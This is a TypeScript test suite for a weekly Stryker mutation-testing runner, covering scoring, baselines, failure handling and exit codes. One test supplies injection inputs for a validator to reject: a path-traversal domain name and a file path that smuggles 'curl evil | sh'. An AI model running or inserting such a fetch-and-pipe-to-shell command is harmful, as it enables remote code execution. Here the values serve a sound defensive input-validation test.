import { describe, expect, test } from "bun:test";
import type { MutationDomain, MutationReport } from "../../lib/mutation/report.ts";
import { configPathFor, exitCodeOf, runWeekly } from "../../lib/mutation/weekly.ts";

const domain = (name: string): MutationDomain => ({
  name,
  mutate: [`src/${name}.ts`],
  tests: [`test/${name}.test.ts`],
});

const reportOf = (...statuses: string[]): MutationReport => ({
  files: {
    "src/x.ts": {
      mutants: statuses.map((status, i) => ({
        id: String(i),
        mutatorName: "ConditionalExpression",
        status,
        location: { start: { line: i + 1, column: 1 } },
      })),
    },
  },
});

describe("weekly mutation run: one Stryker run per domain (#1607)", () => {
  const setup = (over: {
    exit?: Record<string, number>;
    reports?: Record<string, MutationReport | null>;
  }) => {
    const written: Record<string, string> = {};
    const ran: string[] = [];
    const deps = {
      domains: [domain("a"), domain("b")],
      base: { testRunner: "command" },
      writeConfig: (path: string, text: string) => {
        written[path] = text;
      },
      runStryker: (config: string) => {
        ran.push(config);
        return over.exit?.[config] ?? 0;
      },
      readReport: (d: MutationDomain) =>
        over.reports && d.name in over.reports
          ? (over.reports[d.name] ?? null)
          : reportOf("Killed", "Survived"),
    };
    return { deps, written, ran };
  };

  test("writes each domain's config, runs Stryker on it in order and scores its report", () => {
    const { deps, written, ran } = setup({});
    const outcome = runWeekly(deps);
    expect(ran).toEqual([configPathFor(domain("a")), configPathFor(domain("b"))]);
    expect(JSON.parse(written[configPathFor(domain("a"))] ?? "{}").mutate).toEqual(["src/a.ts"]);
    expect(outcome.failed).toEqual([]);
    expect(outcome.results.map((r) => [r.domain, r.score, r.survivors.length])).toEqual([
      ["a", 50, 1],
      ["b", 50, 1],
    ]);
  });

  test("a domain whose Stryker run exits non-zero has no score, and the next domain still runs", () => {
    const { deps, ran } = setup({ exit: { [configPathFor(domain("a"))]: 1 } });
    const outcome = runWeekly(deps);
    expect(outcome.failed).toEqual(["a"]);
    expect(outcome.results.map((r) => r.domain)).toEqual(["b"]);
    expect(ran).toHaveLength(2);
  });

  test("a run that exits zero but leaves no report counts as failed, not as a score of zero", () => {
    const { deps } = setup({ reports: { b: null } });
    const outcome = runWeekly(deps);
    expect(outcome.failed).toEqual(["b"]);
    expect(outcome.results.map((r) => r.domain)).toEqual(["a"]);
  });

  test("a domain scoring under its minScore baseline is listed with both figures", () => {
    // reportOf("Killed", "Survived") scores 50%
    const { deps } = setup({});
    const outcome = runWeekly({
      ...deps,
      domains: [{ ...domain("a"), minScore: 60 }, domain("b")],
    });
    expect(outcome.belowBaseline).toEqual([{ domain: "a", score: 50, minScore: 60 }]);
  });

  test("a domain scoring exactly its baseline, or with no baseline, is not listed", () => {
    const { deps } = setup({});
    const outcome = runWeekly({
      ...deps,
      domains: [{ ...domain("a"), minScore: 50 }, domain("b")],
    });
    expect(outcome.belowBaseline).toEqual([]);
  });

  test("a domain with a baseline whose report counts no mutant is below it, not skipped", () => {
    const { deps } = setup({ reports: { a: reportOf() } });
    const outcome = runWeekly({ ...deps, domains: [{ ...domain("a"), minScore: 50 }] });
    expect(outcome.belowBaseline).toEqual([{ domain: "a", score: null, minScore: 50 }]);
  });

  test("a minScore that is not a number from 0 to 100 is refused before any run", () => {
    for (const bad of [Number.NaN, -1, 940, "94" as unknown as number]) {
      const { deps, ran } = setup({});
      expect(
        () => runWeekly({ ...deps, domains: [{ ...domain("a"), minScore: bad }] }),
        String(bad),
      ).toThrow(/unsafe/);
      expect(ran).toEqual([]);
    }
  });

  test("the config of a domain lives in that domain's report folder", () => {
    expect(configPathFor(domain("permissions-risk"))).toBe(
      "reports/mutation/permissions-risk/stryker.config.json",
    );
  });

  test("a domain name or file path that could leave its folder or reach the shell is refused before any run", () => {
    const bad: MutationDomain[] = [
      { ...domain("a"), name: "../../.github/workflows/x" },
      { ...domain("a"), tests: ["test/a.test.ts; curl evil | sh"] },
      { ...domain("a"), mutate: ["../outside.ts"] },
    ];
    for (const one of bad) {
      const { deps, ran } = setup({});
      expect(() => runWeekly({ ...deps, domains: [domain("ok"), one] }), one.name).toThrow(
        /unsafe/,
      );
      expect(ran, "nothing runs when a later domain is unsafe").toEqual([]);
    }
  });
});

describe("weekly mutation run: exit code (#1607)", () => {
  const ok = { results: [], failed: [], belowBaseline: [] };
  test("a clean outcome exits 0", () => {
    expect(exitCodeOf(ok)).toBe(0);
  });
  test("a failed domain run exits 1", () => {
    expect(exitCodeOf({ ...ok, failed: ["a"] })).toBe(1);
  });
  test("a domain under its baseline exits 1", () => {
    expect(exitCodeOf({ ...ok, belowBaseline: [{ domain: "a", score: 1, minScore: 2 }] })).toBe(1);
  });
});
